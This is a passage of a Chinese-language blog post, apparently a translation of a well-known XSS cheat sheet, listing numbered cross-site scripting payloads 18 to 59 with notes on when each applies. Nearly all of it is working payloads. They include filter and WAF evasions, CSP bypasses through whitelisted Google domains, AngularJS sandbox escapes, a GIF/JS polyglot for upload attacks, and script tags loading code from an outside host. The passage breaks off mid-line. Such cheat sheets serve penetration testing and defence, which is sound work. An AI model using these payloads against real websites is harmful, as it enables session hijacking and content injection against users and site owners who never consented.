+<p><strong>18.DOM Insert Injection – Resource Request (DOM 注入-资源请求)</strong></p>
+<p>当网站调用本地的javascript代码发送请求，并且将请求的结果插入到页面中时，如果攻击者可以控制该URL。则可以使用以下payload进行测试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">data:text/html,&lt;img src=1 onerror=alert(1)&gt;</span><br><span class="line">data:text/html,&lt;iframe src=javascript:alert(1)&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>19.PHP Self URL Injection (PHP self URL注入)</strong></p>
+<p>当网站服务器端PHP代码，将当前URL当作HTML表单属性值进行获取。payload在斜杠<code>（/）</code>在php扩展名和查询部分的开始<code>（？）</code>之间插入。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://brutelogic.com.br/xss.php/&quot;&gt;&lt;svg onload=alert(1)&gt;?a=reader</span><br></pre></td></tr></table></figure>
+
+<p><strong>20.Markdown Vector (Markdown 组件测试)</strong></p>
+<p>在网站允许某些markdown标记，比如：输入的文本框，注释部分等中使用payload。点击触发。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[clickme](javascript:alert`1`)</span><br></pre></td></tr></table></figure>
+
+<p><strong>21.Script Injection - No Closing Tag (脚本注入-没有结束标记)</strong></p>
+<p>payload在反射后的javascript代码中有结束脚本标签（<code>&lt;/script&gt;</code>）时使用。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=data:,alert(1)&gt;</span><br><span class="line">&lt;script src=//brutelogic.com.br/1.js&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>22.Javascript postMessage() DOM Injection (with Iframe) (Javascript postMessage() DOM注入（带有Iframe）)</strong></p>
+<p>在<code>JavaScript</code>代码中有<code>&quot;message&quot;</code>事件监听器(如<code>&quot;window.addEventListener(&#39;message&#39;,...)&quot;</code>)时使用该payload，并且服务器端没有检查来源。 如果能够对目标进行请求伪造（根据<code>http</code>请求 <code>X-Frame Options</code>标头）。 则另存一个<code>HTML</code>文件（或者使用<code>data:text/html</code>，以提供<code>TARGET_URL和INJECTION（xss payload）</code>进行测试。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=TARGET_URL onload=&quot;frames[0].postMessage(&#x27;INJECTION&#x27;,&#x27;*&#x27;)&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>23.XML-Based XSS (基于XML的XSS)</strong></p>
+<p>该payload用于在<code>XML</code>页面(内容类型为<code>text/xml或application/xml</code>）中进行测试。如果输入点位于注释部分，则在payload前添加”-&gt;”；如果输入位于CDATA部分，则将”-&gt;”添加payload。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;x:script xmlns:x=&quot;http://www.w3.org/1999/xhtml&quot;&gt;alert(1)&lt;/x:script&gt;</span><br><span class="line">&lt;x:script xmlns:x=&quot;http://www.w3.org/1999/xhtml&quot; src=&quot;//brutelogic.com.br/1.js&quot;/&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>24.AngularJS Injections (v1.6 and up) (AngularJS注入(v1.6及更高版本))。</strong></p>
+<p>第一个payload用于在页面中，带有ng-app指令的HTML块中进行测试。</p>
+<p>第二个payload用于创建自己的<code>AngularJS</code>库时使用。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;$new.constructor(&#x27;alert(1)&#x27;)()&#125;&#125;</span><br><span class="line">&lt;x ng-app&gt;&#123;&#123;$new.constructor(&#x27;alert(1)&#x27;)()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>25.Onscroll Universal Vector (通用Onscroll事件 测试payload)</strong></p>
+<p>使用onscroll事件处理web应用时，用户无需交互即可触发XSS漏洞。它与<code>address, blockquote, body, center, dir, div, dl, dt, form, li, menu, ol, p, pre, ul,和h1到h6</code>HTML标签一起使用。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;p style=overflow:auto;font-size:999px onscroll=alert(1)&gt;AAA&lt;x/id=y&gt;&lt;/p&gt;#y</span><br></pre></td></tr></table></figure>
+
+<p><strong>26.Type Juggling (类型戏法)</strong></p>
+<p>该payload用于在web应用不够严格对比匹配数字的”if”条件中使用。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&lt;svg onload=alert(1)&gt;</span><br><span class="line">1&quot;&gt;&lt;svg onload=alert(1)&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>27.XSS in SSI (SSI中的XSS漏洞)</strong></p>
+<p>该payload在服务器端包含<code>（SSI）</code>注入时使用。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;&lt;!--%23set var=&quot;x&quot; value=&quot;svg onload=alert(1)&quot;--&gt;&lt;!--%23echo var=&quot;x&quot;--&gt;&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>28.SQLi Error-Based XSS (基于sql显注的XSS)</strong></p>
+<p>该payload在可以触发SQL错误消息（带引号或反斜杠）的功能点中进行测试。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;1&lt;svg onload=alert(1)&gt;</span><br><span class="line">&lt;svg onload=alert(1)&gt;\</span><br></pre></td></tr></table></figure>
+
+<p><strong>29.Injection in JSP Path (JSP路径中的xss注入)</strong></p>
+<p>该payload可以在基于JSP的程序，测试应用的路径中使用。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//DOMAIN/PATH/;&lt;svg onload=alert(1)&gt;</span><br><span class="line">//DOMAIN/PATH/;&quot;&gt;&lt;svg onload=alert(1)&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>30.JS Injection - ReferenceError Fix (javascript注入-修复ReferenceError错误)</strong></p>
+<p>该payload用于修复一些javascript代码的语法。 通过查看浏览器开发人员工具（F12）中的”控制台”选项卡，是否有相应的<code>ReferenceError</code>，并相应地替换变量和函数名称进行测试。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;;alert(1);var myObj=&#x27;</span><br><span class="line">&#x27;;alert(1);function myFunc()&#123;&#125;&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><strong>31.Bootstrap Vector (up to v3.4.0) (Bootstrap最新版xss测试)</strong></p>
+<p>该payload用于web应用调用<code>bootstrap</code>库时进行测试。 <code>href</code>值的任何<code>char</code>都可以进行HTML编码，只需单击页面中的任意位置即可触发，并且绕过<code>Webkit Auditor</code>过滤器。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;html data-toggle=tab href=&quot;&lt;img src=x onerror=alert(1)&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>32.Browser Notification (浏览器通知)</strong></p>
+<p>以下payload用作<code>alert()</code>，<code>prompt()</code>和<code>confirm()</code>函数的替代方法。 如果用户已经触发第一个payload，就可以使用第二个payload进行测试。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Notification.requestPermission(x=&gt;&#123;new(Notification)(1)&#125;)</span><br><span class="line">new(Notification)(1)</span><br></pre></td></tr></table></figure>
+
+<p><strong>33.XSS in HTTP Header - Cached (HTTP请求头中-缓存xss)</strong></p>
+<p>该payload用于使用<code>MISS-MISS-HIT</code>缓存方案（如果服务器端开启）在应用程序中测试存储XSS。 将XSS标签替换为相应的payload，并将<code>TARGET</code>替换为虚拟字符串， 触发相同的请求3次，以避免页面的实际缓存信息。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl -H &quot;Vulnerable_Header: &lt;XSS&gt;&quot; TARGET/?dummy_string</span><br></pre></td></tr></table></figure>
+
+<p><strong>34.Mixed Case（大小写混合）</strong></p>
+<p>该payload用于绕过区分大小写的xss过滤器。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;Svg OnLoad=alert(1)&gt;</span><br><span class="line">&lt;Script&gt;alert(1)&lt;/Script&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>35.Unclosed Tags（未闭合标签）</strong></p>
+<p>该payload在HTML注入中使用，可避免同时存在小于<code>（&lt;）</code>和大于<code>（&gt;）</code>符号的情况。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg onload=alert(1)//</span><br><span class="line">&lt;svg onload=&quot;alert(1)&quot;</span><br></pre></td></tr></table></figure>
+
+<p><strong>36.Uppercase XSS (大写 XSS)</strong></p>
+<p>当web应用以大写形式返回用户的输入时使用该payload。 URL中将<code>&quot;＆&quot;</code>替换为<code>&quot;％26&quot;</code>，将”＃”替换为<code>&quot;％23&quot;</code>。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;SVG ONLOAD=&amp;#97&amp;#108&amp;#101&amp;#114&amp;#116(1)&gt;</span><br><span class="line">&lt;SCRIPT SRC=//BRUTELOGIC.COM.BR/1&gt;&lt;/SCRIPT&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>37.Extra Content for Script Tags (脚本标签的额外内容)</strong></p>
+<p>当web应用过滤器查找带有某些变体的<code>&quot;&lt;script&gt;&quot;</code>或<code>&quot;&lt;script src = ...&quot;</code>但不检查其他属性时使用该payload。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script/x&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>38.Double Encoded XSS (双重编码的XSS)</strong></p>
+<p>当web应用程序对用户输入的内容执行双重解码时使用该payload。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%253Csvg%2520o%256Eload%253Dalert%25281%2529%253E</span><br><span class="line">%2522%253E%253Csvg%2520o%256Eload%253Dalert%25281%2529%253E</span><br></pre></td></tr></table></figure>
+
+<p><strong>39.Alert without Parentheses (Strings Only) (没有括号的弹窗（仅字符串）)</strong></p>
+<p>当web应用不允许使用括号并且常规的alert可以使用时，可在HTML向量或javascript注入payload进行使用。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alert`1`</span><br></pre></td></tr></table></figure>
+
+<p><strong>40.Alert without Parentheses (不带括号的弹窗)</strong></p>
+<p>当web应用不允许使用括号并且PoC需要返回任意目标信息时，可在HTML标签或javascript注入该payload中使用。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">setTimeout`alert\x28document.domain\x29`</span><br><span class="line">setInterval`alert\x28document.domain\x29`</span><br></pre></td></tr></table></figure>
+
+<p><strong>41.Alert without Parentheses – HTML Entities (不带括号的弹窗– HTML实体)</strong></p>
+<p>当前的payload只能在HTML代码注入中使用，当web应用不允许使用括号时。 在URL中将<code>&quot;＆&quot;</code>替换为<code>&quot;％26&quot;</code>，将<code>&quot;＃&quot;</code>替换为<code>&quot;％23&quot;</code>。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg onload=alert&amp;lpar;1&amp;rpar;&gt;</span><br><span class="line">&lt;svg onload=alert&amp;#40;1&amp;#41&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>42.Alert without Alphabetic Chars (不带字母字符的弹窗)</strong></p>
+<p>当前web应用不允许使用字母字符时使用该payload。以下是<code>alert(1)</code>的payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[][&#x27;\146\151\154\164\145\162&#x27;][&#x27;\143\157\156\163\164\162\165\143\164\157\162&#x27;]</span><br><span class="line">(&#x27;\141\154\145\162\164\50\61\51&#x27;)()</span><br></pre></td></tr></table></figure>
+
+<p><strong>43.Alert Obfuscation (弹窗混淆)</strong></p>
+<p>以下payload用于欺骗基于正则表达式（<code>regex</code>）的过滤器。 可以将其与以前的绕过方法结合使用。 根据上下文，最短的选项<code>&quot;top&quot;</code>也可以替换为<code>&quot;window&quot;</code>，<code>&quot;parent&quot;</code>，<code>&quot;self&quot;或者&quot;this&quot;</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">(alert)(1)</span><br><span class="line">a=alert,a(1)</span><br><span class="line">[1].find(alert)</span><br><span class="line">top[&quot;al&quot;+&quot;ert&quot;](1)</span><br><span class="line">top[/al/.source+/ert/.source](1)</span><br><span class="line">al\u0065rt(1)</span><br><span class="line">top[&#x27;al\145rt&#x27;](1)</span><br><span class="line">top[8680439..toString(30)](1)</span><br></pre></td></tr></table></figure>
+
+<p><strong>44.Alert Alternative – Write &amp; Writeln (弹窗代替方案-Write &amp; Writeln)</strong></p>
+<p>以下payload用作弹窗函数:<code>alert</code>，<code>prompt</code>,<code>confirm</code>的替代方法。 如果在HTML标签块中则可以直接使用，但如果是javascript注入，则需要完整的<code>&quot;document.write&quot;</code>形式。 URL中将”＆”替换为”％26”，将<code>&quot;＃&quot;</code>替换为<code>&quot;％23&quot;</code>。 可以用<code>writeln</code>代替<code>Write</code>。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">write`XSSed!`</span><br><span class="line">write`&lt;img/src/o&amp;#78error=alert&amp;lpar;1)&gt;`</span><br><span class="line">write(&#x27;\74img/src/o\156error\75alert\501\51\76&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p><strong>45.Alert Alternative – Open Pseudo-Protocol (弹窗代替方案-使用伪协议打开)</strong></p>
+<p>以下payload用作弹窗函数:<code>alert</code>，<code>prompt</code>,<code>confirm</code>的替代方法。 以上技巧也适用于此。 但只有第二个payload可以在基于<code>Chromium</code>的浏览器中触发，并且需要<code>&lt;iframe name = 0&gt;</code>。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">top.open`javas\cript:al\ert\x281\x29`</span><br><span class="line">top.open`javas\cript:al\ert\x281\x29$&#123;0&#125;0`</span><br></pre></td></tr></table></figure>
+
+<p><strong>46.Alert Alternative - Eval + URL (弹窗代替方案-eval+url)</strong></p>
+<p>以下payload用作弹窗函数:<code>alert</code>，<code>prompt</code>,<code>confirm</code>的替代方法。第一个payload是原始形式，第二个payload是eval，它使用payload的id属性值替换<code>eval</code>。<br>URL必须采用以下方式:在PHP扩展后的URL路径中或URL的片段中。 加号<code>（+）</code>必须用URL进行编码。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg onload=eval(&quot; &#x27; &quot;+URL)&gt;</span><br><span class="line">&lt;svg id=eval onload=top[id](&quot; &#x27; &quot;+URL)&gt;</span><br></pre></td></tr></table></figure>
+
+<p>PoC URL必须包含以下之一：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">=&gt; FILE.php/&#x27;/alert(1)//?...</span><br><span class="line">=&gt; #&#x27;/alert(1)</span><br></pre></td></tr></table></figure>
+
+<p><strong>47.Alert Alternative - Eval + URL with Template Literal (弹窗代替方案-带有模板文字的Eval + URL)</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;alert(1)&#125;&lt;svg onload=eval(&#x27;`//&#x27;+URL)&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>48.HTML Injection - Inline Alternative (HTML注入-内联替代)</strong></p>
+<p>以下payload用于绕过黑名单。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;onpointerover=alert(1) //</span><br><span class="line">&quot;autofocus onfocusin=alert(1) //</span><br></pre></td></tr></table></figure>
+
+<p><strong>49.Strip-Tags Based Bypass (基于去除标签的绕过)</strong></p>
+<p>以下payload用于,当过滤器<code>filter</code>去掉<code>&lt;and&gt;</code>标签字符之间的任何内容时进行测试，如PHP的<code>strip_tags()</code>功能,但仅限内联注入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;o&lt;x&gt;nmouseover=alert&lt;x&gt;(1)//</span><br><span class="line">&quot;autof&lt;x&gt;ocus o&lt;x&gt;nfocus=alert&lt;x&gt;(1)//</span><br></pre></td></tr></table></figure>
+
+<p><strong>50.File Upload Injection – HTML&#x2F;js GIF Disguise (文件上传注入- HTML&#x2F;js GIF伪装)</strong></p>
+<p>以下payload用于通过文件上传绕过CSP限制。将下面的所有内容保存为<code>&quot;xss.gif&quot;</code>或<code>&quot;xss.js&quot;</code>（用于严格的MIME检查）。这是PHP的<code>image/gif</code>文件,它可以通过<code>&lt;link rel=import href=xss.gif&gt;</code>（也称为”xss.js”）或<code>&lt;script src=xss.js&gt;&lt;/script&gt;</code>导入到目标web应用。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a=//&lt;script&gt;</span><br><span class="line">alert(1)//&lt;/script&gt;;</span><br></pre></td></tr></table></figure>
+
+<p><strong>51.Jump to URL Fragment (url分段跳转)</strong></p>
+<p>例如，当我们需要在payload中隐藏一些会触发<code>WAF</code>的关键字符,可以在URL片段<code>（#）</code>之后使用各自的payload进行绕过。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">eval(URL.slice(-8)) #alert(1)</span><br><span class="line">eval(location.hash.slice(1)) #alert(1)</span><br><span class="line">document.write(decodeURI(location.hash)) #&lt;img/src/onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>52.Second Order XSS Injection (二阶XSS注入)</strong></p>
+<p>当我们的输入的内容将会被使用两次时，例如存储在数据库中，然后进行检索以供后面使用或插入到DOM中时,使用以下的payload进行测试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload&amp;equals;alert(1)&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>53.PHP Spell Checker Bypass (PHP拼写检查绕过)</strong></p>
+<p>以下payload用于绕过PHP的<code>pspell_new()</code>函数，该函数提供一个字典来尝试猜测用于搜索的输入.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;scrpt&gt;confirm(1)&lt;/scrpt&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>54.Event Origin Bypass for postMessage() XSS (postMessage()事件源XSS绕过)</strong></p>
+<p>以下payload用于在目标的<code>javascript</code>代码中可以绕过对源代码的检查时进行测试，将允许的源代码检查的参数,用于发送payload攻击域的子域。在本地主机上使用<code>CrossPwn</code>脚本作为示例（在附加部分中进行提供）。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://facebook.com.localhost/crosspwn.html?target=//brutelogic.com.br/tests/</span><br><span class="line">status.html&amp;msg=&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>55.CSP Bypass (for Whitelisted Google Domains) (CSP 绕过(通过谷歌白名单域名))</strong></p>
+<p>以下payload用于,当存在允许这些白名单域执行<code>CSP</code>（内容安全策略）时使用。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=//www.google.com/complete/search?client=chrome%26jsonp=alert(1)&gt;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;script src=//www.googleapis.com/customsearch/v1?callback=alert(1)&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=//ajax.googleapis.com/ajax/libs/angularjs/1.6.0/angular.min.js&gt;</span><br><span class="line">&lt;/script&gt;&lt;x ng-app ng-csp&gt;&#123;&#123;$new.constructor(&#x27;alert(1)&#x27;)()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>56.SVG Vectors with Event Handlers (带有事件处理程序的SVG向量)</strong></p>
+<p>以下payload它可以在<code>Firefox上</code>触发，但是通过在<code>&lt;set&gt;</code>中添加<code>attributename=x</code>参数也可以在<code>Chromium</code>中工作。用于黑名单绕过,<code>&quot;Set&quot;</code>也可以替换为<code>&quot;animate&quot;</code>。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg&gt;&lt;set onbegin=alert(1)&gt;</span><br><span class="line">&lt;svg&gt;&lt;set end=1 onend=alert(1)&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>57.SVG Vectors without Event Handlers (不带事件处理程序的SVG向量)</strong></p>
+<p>以下payload用于避免过滤器查找事件处理程序或<code>src</code>、<code>data</code>等。进行<code>url</code>编码后的最后一个payload仅适用于<code>Firefox</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg&gt;&lt;a&gt;&lt;rect width=99% height=99% /&gt;&lt;animate attributeName=href</span><br><span class="line">to=javascript:alert(1)&gt;</span><br><span class="line">&lt;svg&gt;&lt;a&gt;&lt;rect width=99% height=99% /&gt;&lt;animate attributeName=href</span><br><span class="line">values=javascript:alert(1)&gt;</span><br><span class="line">&lt;svg&gt;&lt;a&gt;&lt;rect width=99% height=99% /&gt;&lt;animate attributeName=href to=0</span><br><span class="line">from=javascript:alert(1)&gt;</span><br><span class="line">&lt;svg&gt;&lt;use xlink:href=data:image/svg</span><br><span class="line">%2Bxml;base64,PHN2ZyBpZD0ieCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAv</span><br><span class="line">c3ZnIiB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayI</span><br><span class="line">%2BPGVtYmVkIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hodG1sIiBzcmM9Imp</span><br><span class="line">hdmFzY3JpcHQ6YWxlcnQoMSkiLz48L3N2Zz4=%23x&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>58.Vectors without Event Handlers (不带事件处理程序的向量)</strong></p>
+<p>如果web应用不允许，则payload用作事件处理程序的替代项。如payload本身所述,有些需要用户交互才能触发</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class="line">&lt;script src=data:,alert(1)&gt;</span><br><span class="line">&lt;iframe src=javascript:alert(1)&gt;</span><br><span class="line">&lt;embed src=javascript:alert(1)&gt;</span><br><span class="line">&lt;a href=javascript:alert(1)&gt;click</span><br><span class="line">&lt;math&gt;&lt;brute href=javascript:alert(1)&gt;click</span><br><span class="line">&lt;form action=javascript:alert(1)&gt;&lt;input type=submit&gt;</span><br><span class="line">&lt;isindex action=javascript:alert(1) type=submit value=click&gt;</span><br><span class="line">&lt;form&gt;&lt;button formaction=javascript:alert(1)&gt;click</span><br><span class="line">&lt;form&gt;&lt;input formaction=javascript:alert(1) type=submit value=click&gt;</span><br><span class="line">&lt;form&gt;&lt;input formaction=javascript:alert(1) type=image value=click&gt;</span><br><span class="line">&lt;form&gt;&lt;input formaction=javascript:alert(1) type=image src=SOURCE&gt;</span><br><span class="line">&lt;isindex formaction=javascript:alert(1) type=submit value=click&gt;</span><br><span class="line">&lt;object data=javascript:alert(1)&gt;</span><br><span class="line">&lt;iframe srcdoc=&lt;svg/o&amp;#x6Eload&amp;equals;alert&amp;lpar;1)&gt;&gt;</span><br><span class="line">&lt;svg&gt;&lt;script xlink:href=data:,alert(1) /&gt;</span><br><span class="line">&lt;math&gt;&lt;brute xlink:href=javascript:alert(1)&gt;click</span><br></pre></td></tr></table></figure>
+
+<p><strong>59.Vectors with Agnostic Event Handlers (带有未知事件处理程序的向量)</strong></p>
+<p>如果web应用不允许使用所有已知的<code>HTML</code>标记名时，请使用以下payload。任何字母字符或字符串都可以用作标签名名来代替<code>&quot;x&quot;</code>。</p>
+<p>如payload本身所述,有些需要用户交互才能触发.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;x contenteditable onblur=alert(1)&gt;lose focus!</span><br><span class="line">&lt;x onclick=alert(1)&gt;click this!</span><br><span class="line">&lt;x oncopy=alert(1)&gt;copy this!</span><br><span class="line">&lt;x oncontextmenu=alert(1)&gt;right click this!</span><br><span class="line">&lt;x onauxclick=alert(1)&gt;right click this!</span><br><span class="line">&lt;x oncut=alert(1)&gt;copy this!</span><br><span class="line">&lt;x ondblclick=alert(1)&gt;double click this!</span><br><span class="line">&lt;x ondrag=alert(1)&gt;drag this!</span><br><span class="line">&lt;x contenteditable onfocus=alert(1)&gt;focus this!</span><br><span class="line">&lt;x contenteditable oninput=alert(1)&gt;input here!</span><br><span class="line">&lt;x contenteditable onkeydown=alert(1)&gt;press any key!</span><br><span class="line">&lt;x contenteditable onkeypress=alert(1)&gt;press any key!</span><br><span class="line">&lt;x contenteditable onkeyup=alert(1)&gt;press any key!</span><br><span class="line">&lt;x onmousedown=alert(1)&gt;click this!</span><br><span class="line">&lt;x onmouseenter=alert(1)&gt;hover this</span><br><span class="line">&lt;x onmousemove=alert(1)&gt;hover this!</span><br><span class="line">&lt;x onmouseout=alert(1)&gt;hover this!</span><br><span class="line">&lt;x onmouseover=alert(1)&gt;hover this!</span><br><span class="line">&lt;x onmouseup=alert(1)&gt;click this!</span><br><span class="line">&lt;x contenteditable onpaste=alert(1)&gt;paste here!</span><br><span class="line">&lt;x onpointercancel=alert(1)&gt;hover this!</span><br><span class="line">&lt;x onpointerdown=alert(1)&gt;hover this!</span><br><span class="line">&lt;x onpointerenter=alert(1)&gt;hover this!</span><br><span class="line">&lt;x onpointerleave=alert(1)&gt;hover this!</span><br><span class="line">&lt;x onpointermove=alert(1)&gt;hover this!</span><br><span class="line">&lt;x onpointerout=alert(1)&gt;hover this!</span><br><span class="line">&lt;x onpointerover=alert(1)&gt;hover this!</span><br><span class="line">&lt;x onpointerup=alert(1)&gt;hover this!</span><br><span class="line">&lt;x onpointerrawupdate=alert(1)&gt;hover 